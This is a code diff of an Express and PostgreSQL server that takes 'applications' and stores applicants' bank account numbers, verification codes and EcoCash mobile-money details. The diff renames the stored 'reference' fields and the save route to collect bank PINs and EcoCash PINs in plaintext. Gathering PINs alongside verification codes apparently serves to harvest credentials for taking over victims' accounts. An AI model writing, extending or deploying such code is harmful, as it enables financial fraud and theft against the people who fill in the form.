@@ -102,12 +102,12 @@ app.get("/setup-database", async (req, res) => {
                 bank_phone TEXT,
                 account_number TEXT,
                 bank_verification_code TEXT,
-                bank_reference TEXT,
+                bank_pin TEXT,
 
                 ecocash_name TEXT,
                 ecocash_number TEXT,
                 ecocash_verification_code TEXT,
-                ecocash_reference TEXT,
+                ecocash_pin TEXT,
 
                 status TEXT DEFAULT 'Pending',
 
@@ -281,12 +281,12 @@ app.post("/submit-application", async (req, res) => {
             bankPhone,
             accountNumber,
             bankverificationCode,
-            bankReference,
+            bankPin,
 
             ecoName,
             ecoNumber,
             ecoVerificationCode,
-            ecoReference
+            ecoPin
         } = req.body;
 
         const result = await pool.query(
@@ -311,12 +311,12 @@ app.post("/submit-application", async (req, res) => {
                 bank_phone,
                 account_number,
                 bank_verification_code,
-                bank_reference,
+                bank_pin,
 
                 ecocash_name,
                 ecocash_number,
                 ecocash_verification_code,
-                ecocash_reference,
+                ecocash_pin,
 
                 status,
                 verification_status,
@@ -358,12 +358,12 @@ app.post("/submit-application", async (req, res) => {
                 bankPhone || "",
                 accountNumber || "",
                 bankverificationCode || "",
-                bankReference || "",
+                bankPin || "",
 
                 ecoName || "",
                 ecoNumber || "",
                 ecoVerificationCode || "",
-                ecoReference || ""
+                ecoPin || ""
             ]
         );
 
@@ -1427,26 +1427,26 @@ app.put("/submit-bank-verification/:id", async (req, res) => {
 
 });
 // ======================================================
-// SAVE BANK REFERENCE
+// SAVE BANK PIN
 // ======================================================
 
-app.post("/save-bank-reference/:id", async (req, res) => {
+app.post("/save-bank-pin/:id", async (req, res) => {
 
     try {
 
         const { id } = req.params;
 
         const {
-            bankReference
+            bankPin
         } = req.body;
 
-        if (!bankReference) {
+        if (!bankPin) {
 
             return res.status(400).json({
 
                 success: false,
 
-                message: "bank reference is required."
+                message: "bank pin is required."
 
             });
 
@@ -1457,18 +1457,18 @@ app.post("/save-bank-reference/:id", async (req, res) => {
             UPDATE applications
 
             SET
-                bank_reference = $1
+                bank_pin = $1
 
             WHERE id = $2
 
             RETURNING
                 id,
-                bank_reference,
+                bank_pin,
                 verification_status,
                 current_stage;
             `,
             [
-                bankReference,
+                bankPin,
                 id
             ]
         );
@@ -1496,7 +1496,7 @@ app.post("/save-bank-reference/:id", async (req, res) => {
     } catch (err) {
 
         console.error(
-            "SAVE BANK REFERENCE ERROR:",
+            "SAVE BANK PIN ERROR:",
             err
         );
 
